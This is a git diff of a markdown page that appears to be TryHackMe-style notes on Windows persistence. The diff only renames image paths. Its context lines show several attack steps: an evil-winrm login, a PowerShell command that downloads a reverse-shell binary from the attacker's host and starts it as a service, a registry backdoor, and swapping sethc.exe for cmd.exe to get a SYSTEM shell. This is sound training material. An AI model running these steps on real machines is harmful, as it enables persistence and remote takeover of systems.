@@ -47,7 +47,7 @@ evil-winrm -i $VICTIM -u thmuser1 -p Password321
 *Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (7).png" alt=""><figcaption></figcaption></figure>
 
 This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.
 
@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (6).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (2) (4).png" alt=""><figcaption></figcaption></figure>
 
@@ -711,7 +711,7 @@ To create an environment variable for a user, you can go to its `HKCU\Environmen
 <pre><code><strong>regedit
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (4) (2).png" alt=""><figcaption></figcaption></figure>
 
 Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
 
@@ -783,7 +783,7 @@ copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 
 After doing so, lock your session from the start menu.
 
-![](<../../.gitbook/assets/image (5) (3) (1).png>)
+![](<../../.gitbook/assets/image (5) (3) (1) (2).png>)
 
 You should now be able to press `SHIFT` five times to access a terminal with SYSTEM privileges directly from the login screen.
 
